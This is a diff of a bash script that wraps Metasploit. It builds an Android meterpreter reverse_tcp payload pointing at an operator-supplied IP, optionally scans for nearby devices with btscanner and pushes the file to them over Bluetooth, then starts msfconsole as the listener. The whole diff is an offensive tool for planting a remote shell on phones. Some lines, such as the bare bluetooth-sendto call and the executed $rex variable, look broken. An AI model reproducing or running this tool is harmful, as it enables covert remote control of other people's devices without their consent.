@@ -37,37 +37,41 @@ if [[ "$f" == 'first' || "$f" == '1' || "$f" == 'android'  ]];
  echo "1.Browser "
  echo "2.App-exploit"
  read s
+
  if [[ "$s" == 'app' || "$s" == '2'  ]];
   then
   echo "enter your ip address:"
   echo "need ip address? (local) (y/n) :"
   read i
-   if [[ "$i" == 'y' || "$i" == 'yes'  ]]; 
+ 
+  if [[ "$i" == 'y' || "$i" == 'yes'  ]]; 
       then 
       sudo ifconfig
       ip address
       echo "ip address: "
    fi
+
     if [[ "$i" == 'n' || "$i" == 'no' ]];
      then 
       echo "no need for them ip addresses "
       echo "ip address: "
     fi
   read ip
-  echo $ip >>ipfile
   echo "app name:"
   read name 
     msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=556 R> $name
     echo "do you want to send the payload via bluethooth? (y/n) "
     read bt
+
     if [[ "$bt" == 'y' || "$bt" == 'Y' ]];
-     then 
-     btscanner hci0 
+     then
+     sudo hciconfig hci0 up
+     sudo btscanner hci0 
      echo "enter the address"
      read btad
      bluetooth-sendto 
     fi
-    msfconsole -r android.rc
+    msfconsole -r android.rc -x set lhost $ip
 fi
 
 
@@ -174,6 +178,7 @@ if [[ $cho == "y" ]]
  then
  echo "the name of the exploit: "
  $rex
+ sleep 2
  msfconsole -x info $rex
 fi
 fi
